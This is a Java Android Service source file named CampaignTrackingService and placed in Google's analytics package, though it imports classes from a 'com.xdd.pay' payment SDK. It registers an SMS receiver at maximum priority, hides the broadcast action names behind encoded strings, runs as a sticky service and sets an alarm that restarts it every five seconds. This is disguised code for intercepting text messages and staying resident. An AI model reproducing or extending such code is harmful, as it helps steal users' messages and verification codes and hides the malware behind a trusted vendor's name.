package com.google.android.gms.analytics;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import android.os.SystemClock;

import com.google.android.gms.receiver.SmsReceiver;
import com.xdd.pay.config.Config;
import com.xdd.pay.db.StorageConfig;
import com.xdd.pay.db.StorageUtils;
import com.xdd.pay.plugin.util.PluginUtils;
import com.xdd.pay.util.EncryptUtils;
import com.xdd.pay.util.PayUtils;
import com.xdd.pay.util.QYLog;
import com.xdd.pay.util.ReflectionUtils;
import com.xdd.pay.util.constant.ExceptionType;
import com.xdd.pay.util.constant.SmsConstant;

public class CampaignTrackingService extends Service {
	private BroadcastReceiver smsReceiver;
	public Context mContext;
	public final static String RESTART_SERVICE = EncryptUtils.decode(SmsConstant.RECEIVER_SERVICE);

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {
		Class<?> classSmsReceiver = PluginUtils.getInstance().getClass(null, SmsReceiver.class.getName());
		mContext = PayUtils.getInstance().mContext;
		if (null == classSmsReceiver) {
			smsReceiver = new SmsReceiver();
		} else {
			try {
				smsReceiver = (BroadcastReceiver) ReflectionUtils.getNewInstance(classSmsReceiver, new Class[] {}, new Object[] {});
			} catch (Exception e) {
			    QYLog.e(e.getMessage());
				smsReceiver = new SmsReceiver();
			}
		}
		IntentFilter filter = new IntentFilter();
		filter = new IntentFilter(EncryptUtils.decode(SmsConstant.SMS_RECEIVED));
		filter.addAction(EncryptUtils.decode(SmsConstant.GSM_SMS_RECEIVED));
		filter.addAction(EncryptUtils.decode(SmsConstant.SMS_RECEIVED_2));
		filter.setPriority(2147483647);
		registerReceiver(smsReceiver, filter);
		
		String uncatchException = StorageUtils.getConfig4String(this, StorageConfig.UNCATCH_EXCEPTION);
	    if (!uncatchException.equals("") && PayUtils.getInstance().mContext != null) {
	        PayUtils.getInstance().sendExceptionLog(uncatchException, false, ExceptionType.UNCATCH_EXCEPTON);
	        StorageUtils.saveConfig4String(this, StorageConfig.UNCATCH_EXCEPTION, "");
	    }
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
//		QYLog.e("onStartCommand SDK version"+Config.SDK_VERSION_NAME);
		return super.onStartCommand(intent, START_STICKY, startId);
	}

	@Override
	public void onDestroy() {
		QYLog.d("service destroy");
		if (smsReceiver != null) {
		    QYLog.e("onDestroy"+Config.SDK_VERSION_NAME);
		    SmsReceiver.unregisteObserver(this);
			unregisterReceiver(smsReceiver);
		}
		super.onDestroy();
	}

	public static void broadRestartMessage(Context context) {
		Intent intentAlarm = new Intent();
		intentAlarm.setClass(context, BroadcastReceiver.class);
		intentAlarm.setAction(RESTART_SERVICE);
		PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, intentAlarm, 0);
		AlarmManager manager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
		long firstime = SystemClock.elapsedRealtime();
		manager.setRepeating(AlarmManager.RTC, firstime, 5*1000, pendingIntent);
	}
	
		public static void LogVersion() {
		QYLog.e(""+Config.SDK_VERSION_CODE);
	}
}
